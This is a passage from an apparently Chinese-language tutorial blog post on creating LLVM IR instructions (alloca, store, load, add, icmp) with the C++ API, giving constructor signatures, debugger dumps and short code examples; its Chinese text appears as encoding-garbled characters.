class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">AllocaInst</span><span class="hljs-params">(Type *Ty, <span class="hljs-type">unsigned</span> AddrSpace, Value *ArraySize,</span></span><br><span class="hljs-params"><span class="hljs-function">                      <span class="hljs-type">const</span> Twine &amp;Name, Instruction *InsertBefore)</span></span>;<br>  <span class="hljs-built_in">AllocaInst</span>(Type *Ty, <span class="hljs-type">unsigned</span> AddrSpace, Value *ArraySize,<br>             <span class="hljs-type">const</span> Twine &amp;Name, BasicBlock *InsertAtEnd);<br><br>  <span class="hljs-built_in">AllocaInst</span>(Type *Ty, <span class="hljs-type">unsigned</span> AddrSpace, <span class="hljs-type">const</span> Twine &amp;Name,<br>             Instruction *InsertBefore);<br>  <span class="hljs-built_in">AllocaInst</span>(Type *Ty, <span class="hljs-type">unsigned</span> AddrSpace,<br>             <span class="hljs-type">const</span> Twine &amp;Name, BasicBlock *InsertAtEnd);<br><br>  <span class="hljs-built_in">AllocaInst</span>(Type *Ty, <span class="hljs-type">unsigned</span> AddrSpace, Value *ArraySize, Align Align,<br>             <span class="hljs-type">const</span> Twine &amp;Name = <span class="hljs-string">&quot;&quot;</span>, Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>);<br>  <span class="hljs-built_in">AllocaInst</span>(Type *Ty, <span class="hljs-type">unsigned</span> AddrSpace, Value *ArraySize, Align Align,<br>             <span class="hljs-type">const</span> Twine &amp;Name, BasicBlock *InsertAtEnd);<br></code></pre></td></tr></table></figure><ul><li><p>AddrSpaceï¼šå¯ä»¥é€šè¿‡Moduleè·å–</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">Module *<span class="hljs-keyword">module</span>;<br><span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getDataLayout</span>().<span class="hljs-built_in">getAllocaAddrSpace</span>()<br></code></pre></td></tr></table></figure><ul><li><p>DataLayoutå°±æ˜¯</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">target datalayout = <span class="hljs-string">&quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>DataLayoutæœ‰AllocaAddrSpaceæˆå‘˜ï¼ŒgetAllocaAddrSpaceæ–¹æ³•å¯ä»¥è·å–è¿™ä¸ªæˆå‘˜</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DataLayout</span> &#123;<br><span class="hljs-keyword">private</span>:<br>  <span class="hljs-type">unsigned</span> AllocaAddrSpace;<br>  <span class="hljs-function"><span class="hljs-type">unsigned</span> <span class="hljs-title">getAllocaAddrSpace</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> AllocaAddrSpace; &#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>Nameï¼šå½¢å¦‚ä»¥ä¸‹è¯­å¥çš„è¿”å›å€¼åç§°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">%<span class="hljs-number">1</span> = alloca i32, align <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure></li><li><p>BasicBlockï¼šæ‰€å±åŸºæœ¬å—</p></li><li><p>InsertBeforeï¼šæ–°å»ºçš„Instructionä¼šæ’åœ¨InsertBeforeä¹‹å‰</p></li><li><p>ArraySizeï¼šæ•°ç»„å¤§å°ï¼Œå¯ä»¥é€šè¿‡æ–°å»ºä¸€ä¸ªConstantIntå®ç°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> ConstantInt *<span class="hljs-title">get</span><span class="hljs-params">(LLVMContext &amp;Context, <span class="hljs-type">const</span> APInt &amp;V)</span></span>;<br></code></pre></td></tr></table></figure><p>APIntå¯ä»¥é€šè¿‡newæ–°å»º</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">APInt</span>(<span class="hljs-type">uint64_t</span> *val, <span class="hljs-type">unsigned</span> bits) : <span class="hljs-built_in">BitWidth</span>(bits) &#123;<br>  U.pVal = val;<br>&#125;<br></code></pre></td></tr></table></figure><p>ğŸŒ°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">Value* intValue = ConstantInt::<span class="hljs-built_in">get</span>(context, <span class="hljs-built_in">APInt</span>(<span class="hljs-number">32</span>, <span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure></li><li><p>Alignï¼šå¯ä»¥é€šè¿‡Alignåˆ›å»º</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">Align</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> Value)</span> </span>&#123;<br>  <span class="hljs-built_in">assert</span>(Value &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-string">&quot;Value must not be 0&quot;</span>);<br>  <span class="hljs-built_in">assert</span>(llvm::<span class="hljs-built_in">isPowerOf2_64</span>(Value) &amp;&amp; <span class="hljs-string">&quot;Alignment is not a power of 2&quot;</span>);<br>  ShiftValue = <span class="hljs-built_in">Log2_64</span>(Value);<br>  <span class="hljs-built_in">assert</span>(ShiftValue &lt; <span class="hljs-number">64</span> &amp;&amp; <span class="hljs-string">&quot;Broken invariant&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼ŒAlignä¹Ÿå¯ä»¥åœ¨åˆ›å»ºAllocaInstä¹‹åè®¾ç½®</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">ptr3-&gt;<span class="hljs-built_in">setAlignment</span>(<span class="hljs-built_in">Align</span>(<span class="hljs-number">4</span>));<br></code></pre></td></tr></table></figure></li></ul><p>ğŸŒ°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">AllocaInst *ptr3 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">AllocaInst</span>(IntegerType::<span class="hljs-built_in">get</span>(context, <span class="hljs-number">32</span>), <span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getDataLayout</span>().<span class="hljs-built_in">getAllocaAddrSpace</span>(),<span class="hljs-string">&quot;&quot;</span>,entryBlock);<br>ptr3-&gt;<span class="hljs-built_in">setAlignment</span>(<span class="hljs-built_in">Align</span>(<span class="hljs-number">4</span>));<br></code></pre></td></tr></table></figure><h2 id="store"><a href="#store" class="headerlink" title="store"></a>store</h2><p>storeå‘½ä»¤æ˜¯StoreInstç±»å‹</p><p>æ¯”Instructionå¤šäº†ä¸€ä¸ªSSID</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs cpp">$<span class="hljs-number">4</span> = &#123;<br>  &lt;llvm::Instruction&gt; = &#123;<br>    &lt;llvm::User&gt; = &#123;<br>      &lt;llvm::Value&gt; = &#123;<br>        VTy = <span class="hljs-number">0x466c00</span>,<br>        UseList = <span class="hljs-number">0x0</span>,<br>        SubclassID = <span class="hljs-number">59</span> <span class="hljs-string">&#x27;;&#x27;</span>,<br>        HasValueHandle = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>        SubclassOptionalData = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>        SubclassData = <span class="hljs-number">4</span>,<br>        NumUserOperands = <span class="hljs-number">2</span>,<br>        IsUsedByMD = <span class="hljs-number">0</span>,<br>        HasName = <span class="hljs-number">0</span>,<br>        HasMetadata = <span class="hljs-number">0</span>,<br>        HasHungOffUses = <span class="hljs-number">0</span>,<br>        HasDescriptor = <span class="hljs-number">0</span>,<br>        <span class="hljs-type">static</span> MaxAlignmentExponent = <span class="hljs-number">29</span>,<br>        <span class="hljs-type">static</span> MaximumAlignment = <span class="hljs-number">536870912</span><br>      &#125;, &lt;No data fields&gt;&#125;, <br>    &lt;llvm::ilist_node_with_parent&lt;llvm::Instruction, llvm::BasicBlock&gt;&gt; = &#123;<br>      &lt;llvm::ilist_node&lt;llvm::Instruction&gt;&gt; = &#123;<br>        &lt;llvm::ilist_node_impl&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, <span class="hljs-type">void</span>&gt; &gt;&gt; = &#123;<br>          &lt;llvm::ilist_node_base&lt;<span class="hljs-literal">false</span>&gt;&gt; = &#123;<br>            Prev = <span class="hljs-number">0x470d48</span>,<br>            Next = <span class="hljs-number">0x46abd8</span><br>          &#125;, &lt;No data fields&gt;&#125;, &lt;No data fields&gt;&#125;, &lt;No data fields&gt;&#125;, <br>    members of llvm::Instruction:<br>    Parent = <span class="hljs-number">0x46abb0</span>,<br>    DbgLoc = &#123;<br>      Loc = &#123;<br>        Ref = &#123;<br>          MD = <span class="hljs-number">0x0</span><br>        &#125;<br>      &#125;<br>    &#125;,<br>    Order = <span class="hljs-number">0</span><br>  &#125;, <br>  members of llvm::StoreInst:<br>  SSID = <span class="hljs-number">1</span> <span class="hljs-string">&#x27;\001&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡æ„é€ å‡½æ•°æ–°å»ºä¸€ä¸ªStoreInst</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">public</span>:<br>  <span class="hljs-built_in">StoreInst</span>(Value *Val, Value *Ptr, Instruction *InsertBefore);<br>  <span class="hljs-built_in">StoreInst</span>(Value *Val, Value *Ptr, BasicBlock *InsertAtEnd);<br>  <span class="hljs-built_in">StoreInst</span>(Value *Val, Value *Ptr, <span class="hljs-type">bool</span> isVolatile, Instruction *InsertBefore);<br>  <span class="hljs-built_in">StoreInst</span>(Value *Val, Value *Ptr, <span class="hljs-type">bool</span> isVolatile, BasicBlock *InsertAtEnd);<br>  <span class="hljs-built_in">StoreInst</span>(Value *Val, Value *Ptr, <span class="hljs-type">bool</span> isVolatile, Align Align,<br>            Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>);<br>  <span class="hljs-built_in">StoreInst</span>(Value *Val, Value *Ptr, <span class="hljs-type">bool</span> isVolatile, Align Align,<br>            BasicBlock *InsertAtEnd);<br>  <span class="hljs-built_in">StoreInst</span>(Value *Val, Value *Ptr, <span class="hljs-type">bool</span> isVolatile, Align Align,<br>            AtomicOrdering Order, SyncScope::ID SSID = SyncScope::System,<br>            Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>);<br>  <span class="hljs-built_in">StoreInst</span>(Value *Val, Value *Ptr, <span class="hljs-type">bool</span> isVolatile, Align Align,<br>            AtomicOrdering Order, SyncScope::ID SSID, BasicBlock *InsertAtEnd);<br></code></pre></td></tr></table></figure><ul><li>å°†Valå­˜å…¥Ptr</li><li>isVolatileè¡¨ç¤ºæ˜¯å¦ä¼˜åŒ–</li></ul><p>ğŸŒ°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">StoreInst *st0 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">StoreInst</span>(param1, ptr4, <span class="hljs-literal">false</span>, entryBlock);<br>st0-&gt;<span class="hljs-built_in">setAlignment</span>(<span class="hljs-built_in">Align</span>(<span class="hljs-number">4</span>));<br></code></pre></td></tr></table></figure><h2 id="load"><a href="#load" class="headerlink" title="load"></a>load</h2><p>loadæ˜¯LoadInstç±»å‹ï¼Œä¹Ÿæ¯”Instructionå¤šä¸€ä¸ªSSID</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs cpp">$<span class="hljs-number">5</span> = &#123;<br>  &lt;llvm::UnaryInstruction&gt; = &#123;<br>    &lt;llvm::Instruction&gt; = &#123;<br>      &lt;llvm::User&gt; = &#123;<br>        &lt;llvm::Value&gt; = &#123;<br>          VTy = <span class="hljs-number">0x466d80</span>,<br>          UseList = <span class="hljs-number">0x0</span>,<br>          SubclassID = <span class="hljs-number">58</span> <span class="hljs-string">&#x27;:&#x27;</span>,<br>          HasValueHandle = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>          SubclassOptionalData = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>          SubclassData = <span class="hljs-number">4</span>,<br>          NumUserOperands = <span class="hljs-number">1</span>,<br>          IsUsedByMD = <span class="hljs-number">0</span>,<br>          HasName = <span class="hljs-number">0</span>,<br>          HasMetadata = <span class="hljs-number">0</span>,<br>          HasHungOffUses = <span class="hljs-number">0</span>,<br>          HasDescriptor = <span class="hljs-number">0</span>,<br>          <span class="hljs-type">static</span> MaxAlignmentExponent = <span class="hljs-number">29</span>,<br>          <span class="hljs-type">static</span> MaximumAlignment = <span class="hljs-number">536870912</span><br>        &#125;, &lt;No data fields&gt;&#125;, <br>      &lt;llvm::ilist_node_with_parent&lt;llvm::Instruction, llvm::BasicBlock&gt;&gt; = &#123;<br>        &lt;llvm::ilist_node&lt;llvm::Instruction&gt;&gt; = &#123;<br>          &lt;llvm::ilist_node_impl&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, <span class="hljs-type">void</span>&gt; &gt;&gt; = &#123;<br>            &lt;llvm::ilist_node_base&lt;<span class="hljs-literal">false</span>&gt;&gt; = &#123;<br>              Prev = <span class="hljs-number">0x4686c8</span>,<br>              Next = <span class="hljs-number">0x46abd8</span><br>            &#125;, &lt;No data fields&gt;&#125;, &lt;No data fields&gt;&#125;, &lt;No data fields&gt;&#125;, <br>      members of llvm::Instruction:<br>      Parent = <span class="hljs-number">0x46abb0</span>,<br>      DbgLoc = &#123;<br>        Loc = &#123;<br>          Ref = &#123;<br>            MD = <span class="hljs-number">0x0</span><br>          &#125;<br>        &#125;<br>      &#125;,<br>      Order = <span class="hljs-number">0</span><br>    &#125;, &lt;No data fields&gt;&#125;, <br>  members of llvm::LoadInst:<br>  SSID = <span class="hljs-number">1</span> <span class="hljs-string">&#x27;\001&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æ„é€ å‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">public</span>:<br>  <span class="hljs-built_in">LoadInst</span>(Type *Ty, Value *Ptr, <span class="hljs-type">const</span> Twine &amp;NameStr,<br>           Instruction *InsertBefore);<br>  <span class="hljs-built_in">LoadInst</span>(Type *Ty, Value *Ptr, <span class="hljs-type">const</span> Twine &amp;NameStr, BasicBlock *InsertAtEnd);<br>  <span class="hljs-built_in">LoadInst</span>(Type *Ty, Value *Ptr, <span class="hljs-type">const</span> Twine &amp;NameStr, <span class="hljs-type">bool</span> isVolatile,<br>           Instruction *InsertBefore);<br>  <span class="hljs-built_in">LoadInst</span>(Type *Ty, Value *Ptr, <span class="hljs-type">const</span> Twine &amp;NameStr, <span class="hljs-type">bool</span> isVolatile,<br>           BasicBlock *InsertAtEnd);<br>  <span class="hljs-built_in">LoadInst</span>(Type *Ty, Value *Ptr, <span class="hljs-type">const</span> Twine &amp;NameStr, <span class="hljs-type">bool</span> isVolatile,<br>           Align Align, Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>);<br>  <span class="hljs-built_in">LoadInst</span>(Type *Ty, Value *Ptr, <span class="hljs-type">const</span> Twine &amp;NameStr, <span class="hljs-type">bool</span> isVolatile,<br>           Align Align, BasicBlock *InsertAtEnd);<br>  <span class="hljs-built_in">LoadInst</span>(Type *Ty, Value *Ptr, <span class="hljs-type">const</span> Twine &amp;NameStr, <span class="hljs-type">bool</span> isVolatile,<br>           Align Align, AtomicOrdering Order,<br>           SyncScope::ID SSID = SyncScope::System,<br>           Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>);<br>  <span class="hljs-built_in">LoadInst</span>(Type *Ty, Value *Ptr, <span class="hljs-type">const</span> Twine &amp;NameStr, <span class="hljs-type">bool</span> isVolatile,<br>           Align Align, AtomicOrdering Order, SyncScope::ID SSID,<br>           BasicBlock *InsertAtEnd);<br></code></pre></td></tr></table></figure><p>ğŸŒ°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">LoadInst *ld0 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">LoadInst</span>(IntegerType::<span class="hljs-built_in">get</span>(context, <span class="hljs-number">32</span>), ptr4, <span class="hljs-string">&quot;&quot;</span>,<span class="hljs-literal">false</span>, entryBlock);<br>ld0-&gt;<span class="hljs-built_in">setAlignment</span>(<span class="hljs-built_in">Align</span>(<span class="hljs-number">4</span>));<br></code></pre></td></tr></table></figure><h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><p>addçš„ç±»å‹æ˜¯BinaryOperatorï¼Œæ²¡æœ‰è‡ªå·±çš„dataåŸŸ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> BinaryOperator *<span class="hljs-title">Create</span><span class="hljs-params">(BinaryOps Op, Value *S1, Value *S2,</span></span><br><span class="hljs-params"><span class="hljs-function">                              <span class="hljs-type">const</span> Twine &amp;Name = Twine(),</span></span><br><span class="hljs-params"><span class="hljs-function">                              Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>)</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">static</span> BinaryOperator *<span class="hljs-title">Create</span><span class="hljs-params">(BinaryOps Op, Value *S1, Value *S2,</span></span><br><span class="hljs-params"><span class="hljs-function">                              <span class="hljs-type">const</span> Twine &amp;Name, BasicBlock *InsertAtEnd)</span></span>;<br></code></pre></td></tr></table></figure><p>BinaryOps</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-keyword">enum</span> <span class="hljs-title class_">BinaryOps</span> &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span>  FIRST_BINARY_INST(N)             BinaryOpsBegin = N,</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HANDLE_BINARY_INST(N, OPC, CLASS) OPC = N,</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>   LAST_BINARY_INST(N)             BinaryOpsEnd = N+1</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/Instruction.def&quot;</span></span><br>  &#125;;<br></code></pre></td></tr></table></figure><p>ğŸŒ°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">BinaryOperator *add1 = BinaryOperator::<span class="hljs-built_in">Create</span>(Instruction::Add, ld0, ld1, <span class="hljs-string">&quot;&quot;</span>, entryBlock);<br></code></pre></td></tr></table></figure><h2 id="icmp"><a href="#icmp" class="headerlink" title="icmp"></a>icmp</h2><p>icmpçš„ç±»å‹æ˜¯ICmpInstï¼Œæ²¡æœ‰è‡ªå·±çš„dataåŸŸ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">public</span>:<br>  <span class="hljs-comment">/// Constructor with insert-before-instruction semantics.</span><br>  <span class="hljs-built_in">ICmpInst</span>(<br>    Instruction *InsertBefore,  <span class="hljs-comment">///&lt; Where to insert</span><br>    Predicate pred,  <span class="hljs-comment">///&lt; The predicate to use for the comparison</span><br>    Value *LHS,      <span class="hljs-comment">///&lt; The left-hand-side of the expression</span><br>    Value *RHS,      <span class="hljs-comment">///&lt; The right-hand-side of the expression</span><br>    <span class="hljs-type">const</span> Twine &amp;NameStr = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment">///&lt; Name of the instruction</span><br>  ) : <span class="hljs-built_in">CmpInst</span>(<span class="hljs-built_in">makeCmpResultType</span>(LHS-&gt;<span class="hljs-built_in">getType</span>()),<br>              Instruction::ICmp, pred, LHS, RHS, NameStr,<br>              InsertBefore) &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> NDEBUG</span><br>  <span class="hljs-built_in">AssertOK</span>();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  &#125;<br><br>  <span class="hljs-comment">/// Constructor with insert-at-end semantics.</span><br>  <span class="hljs-built_in">ICmpInst</span>(<br>    BasicBlock &amp;InsertAtEnd, <span class="hljs-comment">///&lt; Block to insert into.</span><br>    Predicate pred,  <span class="hljs-comment">///&lt; The predicate to use for the comparison</span><br>    Value *LHS,      <span class="hljs-comment">///&lt; The left-hand-side of the expression</span><br>    Value *RHS,      <span class="hljs-comment">///&lt; The right-hand-side of the expression</span><br>    <span class="hljs-type">const</span> Twine &amp;NameStr = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment">///&lt; Name of the instruction</span><br>  ) : <span class="hljs-built_in">CmpInst</span>(<span class="hljs-built_in">makeCmpResultType</span>(LHS-&gt;<span class="hljs-built_in">getType</span>()),<br>              Instruction::ICmp, pred, LHS, RHS, NameStr,<br>              &amp;InsertAtEnd) &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> NDEBUG</span><br>  <span class="hljs-built_in">AssertOK</span>();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  &#125;<br><br>  <span class="hljs-comment">/// Constructor with no-insertion semantics</span><br>  <span class="hljs-built_in">ICmpInst</span>(<br>    Predicate pred, <span class="hljs-comment">///&lt; The predicate to use for the comparison</span><br>    Value *LHS,     <span class="hljs-comment">///&lt; The left-hand-side of the expression</span><br>    Value *RHS,     <span class="hljs-comment">///&lt; The right-hand-side of the expression</span><br>    <span class="hljs-type">const</span> Twine &amp;NameStr = <span class="hljs-string">&quot;&quot;</span> <span class="hljs-comment">///&lt; Name of the instruction</span><br>  ) : <span class="hljs-built_in">CmpInst</span>(<span class="hljs-built_in">makeCmpResultType</span>(LHS-&gt;<span class="hljs-built_in">getType</span>()),<br>              Instruction::ICmp, pred, LHS, RHS, NameStr) &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> NDEBUG</span><br>  <span class="hljs-built_in">AssertOK</span>();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  &#125;<br></code></pre></td></tr></table></figure><p>Predicateæ˜¯æ¯”è¾ƒçš„ç±»å‹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Predicate</span> : <span class="hljs-type">unsigned</span> &#123;<br>  <span class="hljs-comment">// Opcode            U L G E    Intuitive operation</span><br>  FCMP_FALSE = <span class="hljs-number">0</span>, <span class="hljs-comment">///&lt; 0 0 0 0    Always false (always folded)</span><br>  FCMP_OEQ = <span class="hljs-number">1</span>,   <span class="hljs-comment">///&lt; 0 0 0 1    True if ordered and equal</span><br>  FCMP_OGT = <span class="hljs-number">2</span>,   <span class="hljs-comment">///&lt; 0 0 1 0    True if ordered and greater than</span><br>  FCMP_OGE = <span class="hljs-number">3</span>,   <span class="hljs-comment">///&lt; 0 0 1 1    True if ordered and greater than or equal</span><br>  FCMP_OLT = <span class="hljs-number">4</span>,   <span class="hljs-comment">///&lt; 0 1 0 0    True if ordered and less than</span><br>  FCMP_OLE = <span class="hljs-number">5</span>,   <span class="hljs-comment">///&lt; 0 1 0 1    True if ordered and less than or equal</span><br>  FCMP_ONE = <span class="hljs-number">6</span>,   <span class="hljs-comment">///&lt; 0 1 1 0    True if ordered and operands are unequal</span><br>  FCMP_ORD = <span class="hljs-number">7</span>,   <span class="hljs-comment">///&lt; 0 1 1 1    True if ordered (no nans)</span><br>  FCMP_UNO = <span class="hljs-number">8</span>,   <span 